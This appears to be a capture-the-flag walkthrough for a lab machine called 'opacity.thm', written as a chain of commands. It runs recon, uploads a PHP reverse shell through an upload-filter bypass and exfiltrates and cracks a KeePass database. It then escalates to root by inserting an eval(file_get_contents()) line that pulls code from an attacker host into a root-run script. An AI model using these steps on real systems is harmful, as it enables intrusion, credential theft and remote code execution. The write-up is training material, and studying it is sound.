# setup
```
edit /etc/hosts
[Target Host IP]	opacity.thm 

```
# nmap
```
sudo nmap -Pn -sCV opacity.thm -oA nmap/prelim

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0fee2910d98e8c53e64de3670c6ebee3 (RSA)
|   256 9542cdfc712799392d0049ad1be4cf0e (ECDSA)
|_  256 edfe9c94ca9c086ff25ca6cf4d3c8e5b (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2023-05-16T05:10:32
|_  start_date: N/Ac
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

```
# directory/file bruteforcing
```
gobuster dir -u http://opacity.thm -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --> /cloud
gobuster dir -u http://opacity.thm/cloud -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -->/cloud/storage.php

```
# intial access as www-data user via file upload 
```
http://opacity.thm/cloud <-- http://"attacker ip"/php-reverse-shell.php#.png <-- #.png filter bypass
http://opacity.thm/cloud/storage.php --> /cloud/images/php-reverse-shell.php
http://opacity.thm/cloud/images/php-reverse-shell.php

```
# keepass database found in /opt directory
```
/opt/dataset.kpdx

```
# base64 copy/paste exfiltration
```
base64 -w0 /opt/dataset.kpdx
echo -n "[REDACTED]" | base64 -d > dataset.kpdx

```

# cracking the keepass database
```
keepass2john dataset.kpdx > keepasshash.txt
john keepasshash.txt -w=/usr/share/wordlists/rockyou.txt

```
# keepass database contains credentials for sysadmin user
```
dataset.kpdx:[REDACTED] 
sysadmin:[REDACTED]

```
# ssh to opacity.thm as sysadmin
```
ssh sysadmin@opacity.thm

```
# local.txt md5 checksum
```
local.txt md5sum --> f74b97190212168a044ad165fc610db0

```
# esicalte to root via backdoored scirpt
```
ls -la /home/sysadmin

drwxr-xr-x 6 sysadmin sysadmin 4096 May 17 01:38 .
drwxr-xr-x 3 root     root     4096 Jul 26  2022 ..
-rw------- 1 sysadmin sysadmin   22 Feb 22 08:09 .bash_history
-rw-r--r-- 1 sysadmin sysadmin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 sysadmin sysadmin 3771 Feb 25  2020 .bashrc
drwx------ 2 sysadmin sysadmin 4096 Jul 26  2022 .cache
drwx------ 3 sysadmin sysadmin 4096 Jul 28  2022 .gnupg
-rw------- 1 sysadmin sysadmin   33 Jul 26  2022 local.txt
-rw-r--r-- 1 sysadmin sysadmin  807 Feb 25  2020 .profile
drwxr-xr-x 3 root     root     4096 Jul  8  2022 scripts
drwx------ 2 sysadmin sysadmin 4096 Jul 26  2022 .ssh
-rw-r--r-- 1 sysadmin sysadmin    0 Jul 28  2022 .sudo_as_admin_successful
-rw------- 1 sysadmin sysadmin  847 May 17 01:37 .viminfo

ls -la /home/sysadmin/scripts/

drwxr-xr-x 3 root     root     4096 Jul  8  2022 .
drwxr-xr-x 6 sysadmin sysadmin 4096 May 17 01:38 ..
drwxr-xr-x 2 sysadmin root     4096 May 17 01:38 lib
-rw-r----- 1 root     sysadmin  519 Jul  8  2022 script.php

ls -la /home/sysadmin/scripts/lib

drwxr-xr-x 2 sysadmin root      4096 May 17 01:38 .
drwxr-xr-x 3 root     root      4096 Jul  8  2022 ..
-rw-r--r-- 1 root     root      9458 Jul 26  2022 application.php
-rw-r--r-- 1 sysadmin sysadmin  1121 May 17 01:37 backup.inc.php
-rw-r--r-- 1 root     root     24514 Jul 26  2022 bio2rdfapi.php
-rw-r--r-- 1 root     root     11222 Jul 26  2022 biopax2bio2rdf.php
-rw-r--r-- 1 root     root      7595 Jul 26  2022 dataresource.php
-rw-r--r-- 1 root     root      4828 Jul 26  2022 dataset.php
-rw-r--r-- 1 root     root      3243 Jul 26  2022 fileapi.php
-rw-r--r-- 1 root     root      1325 Jul 26  2022 owlapi.php
-rw-r--r-- 1 root     root      1465 Jul 26  2022 phplib.php
-rw-r--r-- 1 root     root     10548 Jul 26  2022 rdfapi.php
-rw-r--r-- 1 root     root     16469 Jul 26  2022 registry.php
-rw-r--r-- 1 root     root      6862 Jul 26  2022 utils.php
-rwxr-xr-x 1 root     root      3921 Jul 26  2022 xmlapi.php

cp /home/sysadmin/scripts/lib/backup.inc.php .
edit /home/sysadmin/backup.inc.php 

msfconsole --> exploit/multi/script/web_delivery --> payload/php/reverse_php
eval(file_get_contents('http://[Attacker IP]:8080/GiiipMq', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));

rm /home/sysadmin/scripts/lib/backup.inc.php
mv /home/sysadmin/backup.inc.php /home/sysadmin/scripts/lib/

```
# proof.txt md5 checksum
```
proof.txt md5sum --> f98e44cd937c13072d3fb621092b5994

```
